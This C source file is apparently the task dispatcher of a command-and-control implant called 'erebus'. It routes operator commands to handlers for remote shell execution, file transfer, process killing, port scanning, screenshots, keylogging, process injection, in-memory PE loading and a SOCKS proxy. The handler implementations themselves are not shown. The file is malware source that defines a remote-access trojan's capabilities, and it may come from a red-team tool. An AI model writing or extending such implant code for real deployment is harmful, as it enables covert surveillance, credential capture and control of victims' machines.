#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "erebus/pb_c2.h"
#include "erebus/task_handlers.h"
#include "erebus/tasks.h"

static int run_handler(int (*fn)(const uint8_t *, size_t, uint8_t **, size_t *),
    const erebus_task *task, erebus_task_result *r) {
    if (!fn(task->data, task->data_len, &r->data, &r->data_len)) {
        strncpy(r->error, "task handler failed", sizeof(r->error) - 1);
        r->success = 0;
        return 0;
    }
    r->success = 1;
    return 1;
}

static int run_handler_noarg(int (*fn)(uint8_t **, size_t *), erebus_task_result *r) {
    if (!fn(&r->data, &r->data_len)) {
        strncpy(r->error, "task handler failed", sizeof(r->error) - 1);
        r->success = 0;
        return 0;
    }
    r->success = 1;
    return 1;
}

erebus_task_result erebus_execute_task(const erebus_task *task) {
    erebus_task_result r;
    memset(&r, 0, sizeof(r));
    strncpy(r.task_id, task->task_id, sizeof(r.task_id) - 1);

    clock_t start = clock();

    switch (task->task_type) {
    case EREBUS_TASK_SHELL:
        run_handler(erebus_task_shell_execute, task, &r);
        break;
    case EREBUS_TASK_FILE_DOWNLOAD:
        run_handler(erebus_task_file_download, task, &r);
        break;
    case EREBUS_TASK_FILE_UPLOAD:
        run_handler(erebus_task_file_upload, task, &r);
        break;
    case EREBUS_TASK_PROCESS_LIST:
        run_handler_noarg(erebus_task_process_list, &r);
        break;
    case EREBUS_TASK_PROCESS_KILL:
        run_handler(erebus_task_process_kill, task, &r);
        break;
    case EREBUS_TASK_NET_IFCONFIG:
        run_handler_noarg(erebus_task_net_ifconfig, &r);
        break;
    case EREBUS_TASK_NET_PORTSCAN:
        run_handler(erebus_task_net_portscan, task, &r);
        break;
    case EREBUS_TASK_SCREENSHOT:
        run_handler(erebus_task_screenshot, task, &r);
        break;
    case EREBUS_TASK_KEYLOG_START:
        run_handler(erebus_task_keylog_start, task, &r);
        break;
    case EREBUS_TASK_KEYLOG_STOP:
        run_handler(erebus_task_keylog_stop, task, &r);
        break;
    case EREBUS_TASK_KEYLOG_DUMP:
        run_handler(erebus_task_keylog_dump, task, &r);
        break;
    case EREBUS_TASK_INJECT:
        run_handler(erebus_task_inject, task, &r);
        break;
    case EREBUS_TASK_MODULE:
        if (!erebus_task_module(task->data, task->data_len, &r.data, &r.data_len)) {
            strncpy(r.error, "module execution failed or unknown module", sizeof(r.error) - 1);
            r.success = 0;
        } else {
            r.success = 1;
        }
        break;
    case EREBUS_TASK_EXIT:
    case EREBUS_TASK_SLEEP:
        r.success = 1;
        break;
    case EREBUS_TASK_PE_LOAD:
        run_handler(erebus_task_peload, task, &r);
        break;
    case EREBUS_TASK_SOCKS_START:
        run_handler(erebus_task_socks_start, task, &r);
        break;
    case EREBUS_TASK_SOCKS_STOP:
        run_handler(erebus_task_socks_stop, task, &r);
        break;
    default:
        snprintf(r.error, sizeof(r.error), "unsupported task type: %d", task->task_type);
        r.success = 0;
        break;
    }

    r.execution_time_ms = (int64_t)((clock() - start) * 1000 / CLOCKS_PER_SEC);
    return r;
}